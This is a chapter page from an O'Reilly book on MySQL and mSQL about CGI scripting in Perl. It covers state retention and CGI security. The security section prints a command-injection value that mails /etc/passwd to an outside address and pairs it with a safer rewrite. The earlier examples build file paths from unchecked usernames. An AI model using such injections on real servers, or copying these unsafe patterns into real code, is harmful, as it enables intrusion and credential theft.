<?label 9.4. Important Considerations for CGI Scripts?><html><head><title>Important Considerations for CGI Scripts (MySQL &amp; mSQL)</title><link href="../style/style1.css" type="text/css" rel="stylesheet" />

<meta name="DC.Creator" content="Randy Jay Yarger, George Reese and Tim King" /><meta scheme="MIME" content="text/xml" name="DC.Format" /><meta content="en-US" name="DC.Language" /><meta content="O'Reilly & Associates, Inc." name="DC.Publisher" /><meta scheme="ISBN" name="DC.Source" content="1565924347L" /><meta name="DC.Subject.Keyword" content="stuff" /><meta name="DC.Title" content="MySQL &amp; mSQL" /><meta content="Text.Monograph" name="DC.Type" />

</head><body bgcolor="#ffffff">

<img src="gifs/smbanner.gif" alt="Book Home" usemap="#banner-map" border="0" /><map name="banner-map"><area alt="MySQL and mSQL" href="index.htm" coords="0,0,466,65" shape="rect" /><area alt="Search this book" href="jobjects/fsearch.htm" coords="467,0,514,18" shape="rect" /></map>

<div class="navbar"><table border="0" width="515"><tr><td width="172" valign="top" align="left"><a href="ch09_03.htm"><img src="../gifs/txtpreva.gif" alt="Previous" border="0" /></a></td><td width="171" valign="top" align="center"><a href="index.htm">MySQL &amp; mSQL</a></td><td width="172" valign="top" align="right"><a href="ch09_05.htm"><img src="../gifs/txtnexta.gif" alt="Next" border="0" /></a></td></tr></table></div>
<hr align="left" width="515" />


<h2 class="sect1">9.4. Important Considerations for CGI Scripts</h2>





<p>Now you have seen the basic operation of a CGI transaction: a client
sends information, usually via form data, to the web server. The
server then executes the CGI program, passing it the information. The
CGI program then performs its magic and sends the output back to the
server, where it is relayed to the client. From this point, you must
make the leap from understanding how a CGI program works to
understanding what makes them so popular.</p>





<p>While you've seen enough in this chapter to put together a
rudimentary working CGI program, there are some critical topics you
should learn before putting together real programs with MySQL or
mSQL. First, you have to learn how to support multiple forms. You
also need to study some security features that prevent malicious
users from snooping or removing files on your site.</p>





<a name="ch09-8-fm2xml" /><div class="sect2">
<h3 class="sect2">9.4.1. State Retention</h3>





<p>Although it sounds like something done to hardened criminals,
<a name="INDEX-642" />state retention is really a vitally
important tool in providing advanced services to your users. The
problem is this: HTTP is what is known as a `stateless'
protocol. That is, the client sends a request to the server, the
server returns data to the client and both go their separate ways.
The server keeps no special information about the client that would
aid it in any future transactions. Likewise, there is no guarantee
the client will remember anything about the transaction that it could
use later. This puts an immediate and significant restriction on the
usability of the World Wide Web.</p>





<p>Writing CGI scripts under this protocol is like not having the
ability to remember past conversations. Every time you talked to
someone, no matter how often you had talked to them before, you would
have to reintroduce yourselves and find common ground all over again.
Needless to say, this puts a hamper on productivity. Notice in <a href="ch09_04.htm">Figure 9-1</a> that each time the request reaches the CGI
program, it is a completely new instance of the program, with no
connection to the previous one.</p>





<a name="ch09-24011" /><div class="figure"><img width="502" src="figs/MSQL.0902.gif" height="432" alt="Figure 9-1" /></div><h4 class="objtitle">Figure 9-1. Multiple form requests</h4>

<p>On the client side of things, the advent of
<a name="INDEX-643" />Netscape
Navigator introduced a kludge-like solution called <a name="INDEX-644" />
<a name="INDEX-645" />HTTP
cookies. This involved the creation of a new HTTP header that could
be sent back and forth between the client and server, similar to the
<tt class="literal">Content-Type</tt> and <tt class="literal">Location</tt>
headers. The client browser, upon receiving a cookie header, would
save the information in the cookie as well as a domain -- included
in the cookie information -- in which the cookie is valid. Then
every time the browser accessed a URL within the given domain, the
cookie header would be returned to the server for the use of any CGI
program on that server.</p>





<p>The cookie method is used mainly to store user IDs. Information about
a visitor can be stored in a file on the server machine. A unique ID
for that user is then sent as a cookie to the user's browser.
Now, whenever the user visits the site, the browser automatically
sends the user's ID to the server. The server then passes the
ID to the CGI program, which then opens the appropriate file and has
access to all of the information about the user; all of this
occurring transparently to the user.</p>





<p>Despite its usefulness, most large sites do not use cookies as the
only method of state retention. There are a couple of reasons for
this. First, not all browsers support cookies. Until very recently,
the primary browser for the vision impaired -- not to mention the
fast-net connection impaired -- Lynx, did not support cookies. It
still does not "officially" support them, but some widely
available offshoot versions now do. Secondly, and more importantly,
cookies tie the user to a single machine. One of the great
innovations of the web is that it is accessible from anywhere in the
world. No matter where your web page was created and is stored you
can show it off from any Internet-capable machine anywhere. However,
if you try to access your cookie enhanced site from a machine other
than your own, any personalization performed by the cookies will be
lost.</p>





<p>Many sites still use cookies to provide users with personalized
pages, but most augment the cookies with a traditional login/password
style interface. If the site is accessed from a browser that does not
provide a cookie, the page contains a form where a user enters a
login name and password that was assigned at the time of his or her
first visit. This form is usually small and discreet so as not to
distract from the majority of users who have no interest in any kind
of personalization, but are just passing through. When a user submits
a login name and password via the form, a CGI then finds the correct
information file for that user, just as if the name were sent as a
cookie. Using this method, a person could log into a personalized web
site from anywhere in the world.<a name="INDEX-646" />
<a name="INDEX-647" /></p>





<p>Beyond the issue of user preferences and long-term information, a
more subtle example of state retention can be provided by looking at
popular search engines. When you perform a search through a search
service such as AltaVista or Yahoo, you usually get back many more
results than can be conveniently displayed. The way the search
providers handle this is to show some small number of
results -- usually ten or twenty -- combined with some sort of
navigation tool that allows you to view the next set of results.
While to a casual web surfer, this behavior has become commonplace
and expected, the actual implementation is nontrivial and requires
state retention.</p>





<p>
<a name="INDEX-648" />
<a name="INDEX-649" />When the user first makes a query to
the search engine, the search engine gathers up all of the results,
possibly stopping at some predefined limit. The trick is to then
present these results to the user a few at a time, while remembering
which user wanted the results and which set of results they wanted
next. After stripping out the complexities of the search engine
itself we are left with the problem of providing some sequence of
information to a user, one page at a time. Consider <a href="ch09_04.htm">Example 9-1</a> as an example CGI script that displays ten
lines from a file and presents the user with the ability to view the
next or previous ten lines depending on their position in the file.</p>





<a name="ch09-94438" /><div class="example">
<h4 class="objtitle">Example 9-1. State Retention in a CGI Script </h4>




<blockquote><pre class="code">#!/usr/bin/perl -w

use CGI;

open(F,"/usr/dict/words") or die("Can't open! $!");
#This is the file that will be displayed. It can be any file.

$output = new CGI;

sub print_range { # This is the main function of the program.
        my $start = shift; # The starting line of the file.
        my $count = 0; # A placeholder.
        my $line = ""; # The current line of the file.
        print $output-&gt;header, $output-&gt;start_html('My Dictionary');
        # This starts the HTML with the title 'My Dictionary'.
        print "&lt;pre&gt;\n";
        while (($count &lt; $start) and ($line = &lt;F&gt;)) { $count++; }
        # Skip all of the lines up to the starting line.
        while (($count &lt; $start+10) and ($line = &lt;F&gt;) ) 
                { print $line; $count++; }
        # Then print the next ten lines.

        my $newnext = $start+10;
        my $newprev = $start-10;
        # Set up the starting lines for the 'Next' and 'Previous' URLs.

        print "&lt;/pre&gt;&lt;p&gt;";

        unless ($start == 0) { # Include a 'Previous' URL unless you're already
                               # at the beginning.
                print qq%&lt;a href="read.cgi?start=$newprev"&gt;Previous&lt;/a&gt;%;
        }

        unless (eof) { # Include a 'Next' URL unless you are at the end
                       # of the file.
                print qq% &lt;a href="read.cgi?start=$newnext"&gt;Next&lt;/a&gt;%;
        }
        print &lt;&lt;HTML;
&lt;/body&gt;&lt;html&gt;
HTML
        exit(0);
}

# If there is no data provided, start at the beginning.
if (not $output-&gt;param) {
        &amp;print_range(0);
}

# Else start at the line provided by the data.
&amp;print_range($output-&gt;param('start'));</pre></blockquote>
</div>





<p>This example provides state retention using the simplest possible
method. There's no problem keeping the data persistent, because
we've stored it in a file on the server. All we need to know is
where to start printing. So the script simply includes in the URL the
starting point for the next or previous group of lines, all of the
information needed to generate any subsequent pages.</p>





<p>However, once your needs grow beyond paging through a file, relying
on the URL can become cumbersome. One way to lighten the burden is to
use HTML forms and to include the state information in
<tt class="literal">&lt;INPUT&gt;</tt> tags of type
<tt class="literal">HIDDEN</tt>. This method can go far and is used by many
sites today to link together related CGI programs or to stretch out
the usefulness of one CGI program as in the dictionary example.
Instead of referring to a specific item -- such as the starting
page -- the data in the URL could refer to an automatically
generated user ID number.</p>





<p>This is how AltaVista and the other search engines work. Your initial
search generates a user ID number which is hidden in the subsequent
URLs. This user ID number refers to one or more files on the server
machine that contain the results of your query. Two more values are
included in the URL: your current position in the results file, and
the direction in wish you want to view next. These three values are
all that are needed to provide the powerful navigation system used by
the big search services.</p>





<p>There is still something missing, though. The file used in the
example, <em class="emphasis">/usr/dict/words</em>, is a very big file.
What if we got tired of reading it halfway through but wanted to come
back to it later? Unless I peeked at the URL of the next link, we
would have no way of getting back to where we left off. Even
AltaVista does not provide this. If you restart your computer or use
a different one, there is no way to get back to your old search
without reentering the query. However, this long-term state retention
is the basis of the personalized web sites we mentioned earlier and
it is worth examining how this would work. <a href="ch09_04.htm">Example 9-2</a> is a modified version of <a href="ch09_04.htm">Example 9-1</a>.</p>





<a name="ch09-26010" /><div class="example">
<h4 class="objtitle">Example 9-2. Robust State Retention </h4>




<blockquote><pre class="code">#!/usr/bin/perl -w

use CGI;

umask 0;
open(F,"/usr/dict/words") or die("Can't open! $!");
chdir("users") or die("Can't chdir! $!");
# This is the directory where all of the user information will
# be stored.

$output = new CGI;

if (not $output-&gt;param) {
        print $output-&gt;header, $output-&gt;start_html('My Dictionary');
        print &lt;&lt;HTML;
        &lt;FORM ACTION="read2.cgi" METHOD=POST&gt;
        &lt;p&gt;Enter your username: 
                &lt;INPUT NAME="username" SIZE=30&gt;
        &lt;p&gt;
        &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;
HTML
        exit(0);
}

$user = $output-&gt;param('username');

## If a file for the user does not exist, create one and set the
## Starting value to '0'.
if ( not -e "$user" ) {
        open (U, "&gt;$user") or die("Can't open! $!");
        print U "0\n";
        close U;
        &amp;print_range('0');

## Else, if the user does exist, and the URL didn't specify
## a starting value, read the users last value and start there.
} elsif ( not $output-&gt;param('start') ) {
        open(U,"$user") or die("Can't open user! $!");
        $start = &lt;U&gt;; close U;
        chomp $start;
        &amp;print_range($start);

## Else, if the user does exist, and the URL did specify
## a starting value, write the starting value to the user's
## file and then start printing.
} else {
        open(U,"&gt;$user") or die("Can't open user to write! $!");
        print U $output-&gt;param('start'), "\n";
        close U;
        &amp;print_range($output-&gt;param('start'));
}

sub print_range {
        my $start = shift;
        my $count = 0;
        my $line = "";
        print $output-&gt;header, $output-&gt;start_html('My Dictionary');
        print "&lt;pre&gt;\n";
        while (($count &lt; $start) and ($line = &lt;F&gt;)) { $count++; }
        while (($count &lt; $start+10) and ($line = &lt;F&gt;) ) 
                { print $line; $count++; }
        my $newnext = $start+10;
        my $newprev = $start-10;
        print "&lt;/pre&gt;&lt;p&gt;";
        unless ($start == 0) { 
                print
qq%&lt;a href="read2.cgi?start=$newprev&amp;username=$user"&gt;Previous&lt;/a&gt;%;
        }
        unless (eof) {
                print 
qq% &lt;a href="read2.cgi?start=$newnext&amp;username=$user"&gt;Next&lt;/a&gt;%;
        # Note that the 'username' has been added to the URL.
        # Otherwise the CGI would forget which user it was dealing with.
        }
        print $output-&gt;end_html;
        exit(0);
}</pre></blockquote>
</div>
</div>
















<a name="ch09-9-fm2xml" /><div class="sect2">
<a name="INDEX-650" /><h3 class="sect2">9.4.2. Security</h3>





<p>
<a name="INDEX-651" />
<a name="INDEX-652" />When
it comes to running Internet servers, whether they are HTTP servers
or otherwise, maintaining security is a primary concern. CGI, with
its exchange of information between client and server, raises several
important security related issues. The CGI protocol itself was
designed to be reasonably secure. The information sent to the CGI
program from the server is sent via the standard input or an
environment variable, both secure methods. But once the CGI program
has control of the data, there are no restrictions on what it can do.
A poorly written CGI program can allow a malicious user to gain
access to the server system. Consider the following CGI program:</p>





<blockquote><pre class="code">#!/usr/bin/perl -w

use CGI;
my $output = new CGI;

my $username = $output-&gt;param('username');

print $output-&gt;header, $output-&gt;start_html('Finger Output'), 
"&lt;pre&gt;", `finger $username`, "&lt;/pre&gt;", $output-&gt;end_html;</pre></blockquote>





<p>This program provides a functional CGI interface to the finger
command. If the program is run as just
<em class="emphasis">finger.cgi</em>, it will list all current users on
the server system. If run as
<em class="emphasis">finger.cgi?username=fred</em> it will finger the user
"fred" on the server system. You could even run it as
<em class="emphasis">finger.cgi?username=bob@foo.com</em> to finger a
remote user. However, if a user ran it as
<em class="emphasis">finger.cgi?username=fred;mail+hacker@bar.com&lt;/etc/passwd</em>
unwanted things could happen. The backtick operator
<tt class="literal">``</tt> in Perl spawns a shell and executes a command
returning the result. In this program <em class="emphasis">`finger
$username`</em> is used as an easy way to run the finger
command and retrieve its output. Most shells, however, allow the
grouping of commands on a single line. Any Bourne-like shell does
this via the ";" symbol, for example. So
<em class="emphasis">`finger fred;mail hacker@bar.com&lt;/etc/passwd`</em>
will run the <em class="emphasis">finger</em> command and then run
<em class="emphasis">mail hacker@bar.com&lt;/etc/passwd</em>, possibly
sending the entire password file of the server system to an unwanted
user.</p>





<p>One solution to this is to parse the incoming form data, looking for
possible malicious intent. You could scan for the
"<a name="INDEX-653" />
<a name="INDEX-654" />;" character and remove any
characters after it, for instance. Another possibility is to make it
impossible for such an attack to work, by using alternate methods.
The above CGI program could be rewritten as follows:</p>





<blockquote><pre class="code">#!/usr/local/bin/perl -w

use CGI;
my $output = new CGI;
my $username = $output-&gt;param('username');

$|++; # Disable buffering. This is to make sure that all the data makes it to
      # the client.

print $output-&gt;header, $output-&gt;start_html('Finger Output'), "&lt;pre&gt;\n";

$pid = open(C_OUT, "-|"); # This is a Perl idiom which spawns a child and opens a
                          # filehandle pipe between the parent and child.
if ($pid) { # This is the parent.
     print &lt;C_OUT&gt;; # Print the output from the child.
     print "&lt;/pre&gt;", $output-&gt;end_html;
     exit(0); # End the program.
} elsif (defined $pid) { # This is the child.
     $|++; # Disable the buffering in the child as way.
     exec('/usr/bin/finger',$username) or die("exec() call failed.");
     # This executes the finger program with $username as the first and only
     # command line argument.
} else { die("fork() call failed."); } # Error checking.</pre></blockquote>





<p>As you can see, this is only a marginally more complex program. But
if run as
<em class="emphasis">finger.cgi?username=fred;mail+hacker@bar.com&lt;/etc/passwd</em>,
the finger program is executed with the argument <em class="emphasis">fred;mail
hacker@bar.com&lt;/etc/passwd</em> as if that were a single
username.</p>





<a name="ch09-10-fm2xml" /><blockquote><h4 class="objtitle">NOTE</h4>

<p>As an added level of security, this script also executes
<a name="INDEX-655" />finger
explicitly as <em class="emphasis">/usr/bin/finger</em>. In the unlikely
event that the web server passed a strange <tt class="literal">PATH</tt> to
your CGI program, running just finger could possibly execute
something other than the desired program. Another security step you
could take would be to examine the
<tt class="literal">PATH</tt>
<a name="INDEX-656" /> environment variable and make sure it
has reasonable values. Eliminating (the current working directory)
from <tt class="literal">PATH</tt> is a good idea unless you know for sure
where the current directory is and you have a special need to run a
program there.</p>
</blockquote>





<p>Another important security concern is that of
<a name="INDEX-657" />user
permissions. By default, a web server runs the CGI program as the
same user that the server itself is running. Usually this is a
pseudo-user, such as "nobody," with very few permissions.
So the CGI program also has very few permissions. This is a generally
good thing. This way, if a malicious remote user is able to remote
access the server system via the CGI program, little damage can be
done. The <a name="INDEX-658" />password-stealing example given earlier
is one of the few things that could be done, but actual system damage
can usually be contained.</p>





<p>However, running as a limited user also limits the ability of the
CGI. If the CGI needs to read or write files, it can do so only in
those places where it has permission. In the second persistent state
example, for instance, a file is kept for each user. The CGI must
have permission to read and write to the directory that contains
these files, not to mention the files themselves. One way to do this
would be to make the directory the same user as the server with read
and write permissions for that user only. However, for a user such as
"nobody," only root has that power. If you are a nonroot
user you would have to contact your system administrator every time
you wanted to change your CGI.</p>





<p>Another choice is to make the directory world readable and writable,
essentially removing all protection from it. Since the outside
world's only interface with these files is through your
program, the danger here is not as great as it seems. However, if a
loophole was found in your program, a remote user would have complete
access to all of the files, including the ability to destroy them. In
addition any legitimate users that are working on the server machine
would also have the ability to alter the files. If you going to use
this method, it must be on a server machine where all of the users
are trusted. In addition, use the open directory only for files that
are necessary to the CGI program. In other words, do not put any
unnecessary files at risk.<a name="INDEX-659" />
<a name="INDEX-660" /></p>
</div>
















<a name="ch09-11-fm2xml" /><div class="sect2">
<a name="INDEX-661" /><h3 class="sect2">9.4.3. Further Reading</h3>





<p>If this is your first exposure to CGI programming, there are a many
other places to go from here. Dozens of books have been written on
the subject, and many of them assume no programming knowledge at all.
<em class="emphasis">CGI Programming on the World Wide Web</em> from
O'Reilly and Associates covers the material ranging from basic
scripts in various languages to some really amazing tips and tricks.
Free information is also in abundance on the World Wide Web.
<em class="emphasis">CGI Made Really Easy</em> at
<a href="../../../../../../www.jmarshall.com/easy/cgi/">http://www.jmarshall.com/easy/cgi/</a> is a good
starting place.</p>
</div>


<hr align="left" width="515" />
<div class="navbar"><table border="0" width="515"><tr><td width="172" valign="top" align="left"><a href="ch09_03.htm"><img src="../gifs/txtpreva.gif" alt="Previous" border="0" /></a></td><td width="171" valign="top" align="center"><a href="index.htm"><img src="../gifs/txthome.gif" alt="Home" border="0" /></a></td><td width="172" valign="top" align="right"><a href="ch09_05.htm"><img src="../gifs/txtnexta.gif" alt="Next" border="0" /></a></td></tr><tr><td width="172" valign="top" align="left">9.3. The CGI Specification</td><td width="171" valign="top" align="center"><a href="index/index.htm"><img src="../gifs/index.gif" alt="Book Index" border="0" /></a></td><td width="172" valign="top" align="right">9.5. CGI and Databases
</td></tr></table></div>
<hr align="left" width="515" />

<img src="../gifs/navbar.gif" alt="Library Navigation Links" usemap="#library-map" border="0" />
<p><font size="-1"><a href="copyrght.htm">Copyright &copy; 2001</a> O'Reilly &amp; Associates. All rights reserved.</font></p>

<map name="library-map"><area href="../index.htm" coords="1,1,83,102" shape="rect" /><area href="../lnut/index.htm" coords="81,0,152,95" shape="rect" /><area href="../run/index.htm" coords="172,2,252,105" shape="rect" /><area href="../apache/index.htm" coords="238,2,334,95" shape="rect" /><area href="index.htm" coords="336,0,412,104" shape="rect" /><area href="../dbi/index.htm" coords="415,0,507,101" shape="rect" /><area href="../cgi/index.htm" coords="511,0,601,99" shape="rect" /></map>

</body></html>